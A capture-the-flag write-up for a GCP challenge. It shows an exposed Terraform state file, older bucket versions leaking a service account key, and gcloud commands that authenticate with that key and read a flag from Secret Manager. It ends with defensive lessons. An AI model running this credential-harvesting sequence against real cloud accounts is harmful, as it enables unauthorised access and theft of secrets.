# HiddenState - Cloud Village CTF 2025

## Challenge Overview

HiddenState was a Google Cloud Platform (GCP) security challenge that demonstrated the dangers of public cloud storage buckets with version history enabled and improper secret management in Terraform state files.

## Initial Discovery

### Website Analysis
The challenge began with analyzing the target website's HTML source code, which revealed a crucial comment pointing to infrastructure state:

```html
<!-- Infrastructure state available at: /infra/terraform.tfstate -->
```

This comment disclosed the location of a Terraform state file, which often contains sensitive infrastructure information.

## Terraform State Investigation

### Current State Analysis
We first examined the current `terraform.tfstate` file:

```bash
curl -s http://target-website.com/infra/terraform.tfstate
```

The current state file appeared clean and contained no sensitive secrets or flags.

## Google Cloud Storage Enumeration

### Version History Discovery
The key breakthrough came when we discovered that the state file was stored in a Google Cloud Storage (GCS) bucket with object versioning enabled. This meant older versions of the file might contain sensitive information that was later removed.

### GCS Object Versions
We listed all versions of the Terraform state file:

```bash
gsutil ls -a gs://bucket-name/terraform.tfstate**
```

This revealed multiple versions, including older, larger versions that suggested they contained additional data.

### Historical State File Analysis
Downloading the older, larger version of the state file revealed critical information:

**Discoveries:**
- `flag_hint` - Provided clues about flag location
- `leaked_service_account_key` - Complete GCP service account credentials in JSON format

## Service Account Exploitation

### Credential Extraction
The old Terraform state contained a complete service account key:

```json
{
  "type": "service_account",
  "project_id": "project-id",
  "private_key_id": "key-id",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...",
  "client_email": "service-account@project.iam.gserviceaccount.com",
  "client_id": "...",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token"
}
```

### Google Cloud Authentication
We authenticated using the extracted service account credentials:

```bash
# Save the service account key to a file
echo '[JSON_KEY_CONTENT]' > service-account-key.json

# Authenticate with gcloud
gcloud auth activate-service-account --key-file=service-account-key.json

# Set the project
gcloud config set project PROJECT_ID
```

## Google Secret Manager Access

### Secret Discovery
With the service account credentials, we gained access to Google Secret Manager and discovered a secret named `hidden-state-flag`:

```bash
gcloud secrets list
```

### Flag Retrieval
We accessed the secret containing the flag:

```bash
gcloud secrets versions access latest --secret="hidden-state-flag"
```

## Flag
`FLAG-{bvpkm3ed5onOA4dXSYGPMPfbpA7cfob0}`

## Attack Summary

1. **Source Code Analysis:** Found Terraform state file reference in HTML comments
2. **State File Examination:** Analyzed current state file (clean)
3. **Version Discovery:** Identified GCS bucket with versioning enabled
4. **Historical Analysis:** Downloaded older state file versions
5. **Credential Extraction:** Found leaked service account key in old state
6. **Authentication:** Used leaked credentials to authenticate with GCP
7. **Secret Access:** Accessed Google Secret Manager with elevated privileges
8. **Flag Retrieval:** Retrieved flag from protected secret

## Key Vulnerabilities

- **Public GCS Bucket:** Terraform state accessible to anyone
- **Object Versioning:** Historical versions exposed sensitive data
- **State File Secrets:** Service account credentials stored in Terraform state
- **Excessive Permissions:** Service account had Secret Manager access
- **Poor Secret Management:** Credentials committed to infrastructure state

## Technical Insights

### Terraform State Security
Terraform state files can contain:
- Resource configurations and metadata
- Sensitive outputs and variables
- Provider credentials and API keys
- Database passwords and connection strings

### GCS Version Control Risks
- Object versioning preserves all historical versions
- Deleted sensitive data remains accessible in older versions
- Public buckets expose entire version history
- Version cleanup requires explicit management

## Key Techniques
- HTML source code analysis
- Terraform state file examination
- GCS object version enumeration
- Service account credential extraction
- Google Cloud authentication and authorization
- Secret Manager access and enumeration

## Lessons Learned

This challenge highlighted critical cloud security practices:

### Terraform Security
- **Never store secrets in Terraform state**
- **Use remote state with proper access controls**
- **Enable state encryption and versioning controls**
- **Regular state file security audits**

### GCS Security
- **Disable public access to storage buckets**
- **Carefully manage object versioning policies**
- **Implement proper IAM controls**
- **Regular access review and cleanup**

### Secret Management
- **Use dedicated secret management services**
- **Implement proper service account scoping**
- **Follow principle of least privilege**
- **Regular credential rotation and auditing**

The HiddenState challenge demonstrated how improper cloud storage configuration combined with poor secret management practices can lead to complete infrastructure compromise, emphasizing the need for comprehensive cloud security hygiene.